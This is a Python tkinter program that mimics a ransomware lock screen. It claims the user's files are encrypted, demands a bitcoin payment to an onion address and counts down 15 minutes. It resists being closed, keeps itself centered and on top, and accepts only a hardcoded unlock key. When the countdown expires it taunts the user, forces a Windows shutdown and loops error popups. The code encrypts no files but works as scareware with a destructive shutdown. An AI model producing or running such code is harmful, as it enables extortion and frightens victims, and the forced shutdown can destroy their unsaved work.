from tkinter import messagebox as msg
from tkinter import simpledialog as sd
import tkinter as tk
import os
import sys
import subprocess as sub
import time

name = "Pryzytyx"

sub.run(["cmd.exe", "/c", "echo DUMPING_RAW_FILE...  & timeout /t 1 /nobreak >nul"], creationflags=sub.CREATE_NEW_CONSOLE)


def killscreen():
    win.destroy()
    msg.showinfo("???", "Guess who forgot to pay :)")
    msg.showinfo("???", "I will enjoy killing your PC, .every.last.bit.of.it.")
    msg.showwarning(":)", "Say goodnight.")
    os.system("shutdown /s /t 7")
    while True:
        msg.showerror("HAHA", "HAHAHAHAHAHAHAHA")

canClose = False

def attClose():
    if canClose:
        msg.showinfo(";)", "We thank you for co-operating!")
        win.destroy()
        sys.exit()
    else:
        msg.showwarning("Error", "Error: Access is denied.")

def decry():
    response = sd.askstring("???", "Enter your decryption key. (format: xxx xxx xxx xxx)", parent=win)
    if response == "g31 5vu 82j 1a3":
        global canClose
        canClose = True
        msg.showinfo("Thank you", "You now have permission to close this window.")
    else:
        if response:
            msg.showinfo("Invalid", "The key provided is invalid or incorrect.")

rans = [
    "Ransom-note: Pryzytyx",
    "Your files have been locked/encrypted.",
    "Make a payment of 0.21853 BTC to the website:",
    "\"bi4321i324bh32.payment.onion\" on any Tor Supported Browser.",
    "to receive the decryptor program to unlock your files."
]
win = tk.Tk()
win.resizable(False, False)
win.geometry("500x300")
win.title(name)
win.protocol("WM_DELETE_WINDOW", attClose)
win.attributes("-topmost", True)
win.config(bg="Dark blue")

ransome_note = tk.Label(win, text="⚠ ⚠ ⚠ Oops... looks like you're infected! ⚠ ⚠ ⚠", fg="white", bg="blue")
ransome_note.place(anchor="n", relx=0.5, rely=0.01, relwidth=1)

info_box_frame = tk.Frame(win)
info_box_frame.place(anchor="nw", relx=0.01, rely=0.1, height=175, width=488)

info_box = tk.Text(info_box_frame, bg="black", fg="white")
info_box.delete("1.0", "end")
info_box.insert("1.0", "\n".join(rans))
info_box.config(state="disabled")
info_box.pack()

decrypt = tk.Button(win, text="Decrypt my files", bg="blue", fg="white", command=decry)
decrypt.place(anchor="nw", relx=0.01, rely=0.7, height=25, width=488)

timeleft = tk.Label(win, text="Loading...", bg="black", fg="green")
timeleft.place(anchor="nw", relx=0.01, rely=0.8, height=50, width=488)

def centerd():
    x = (win.winfo_screenwidth() - 500) // 2
    y = (win.winfo_screenheight() - 300) // 2
    win.geometry(f"500x300+{x}+{y}")
    win.after(10, centerd)

win.after(10, centerd)

minutes = 15
seconds = 0

def timeHandler():
    global seconds
    global minutes
    seconds -= 1
    if seconds == -1:
        minutes -= 1
        seconds = 59
        if minutes == -1:
            killscreen()
            return None
    timeleft.config(text=f"Time until decryptor is wiped (Files unrecoverable): {minutes:02}:{seconds:02}.")
    win.after(1000, timeHandler)

timeHandler()

win.mainloop()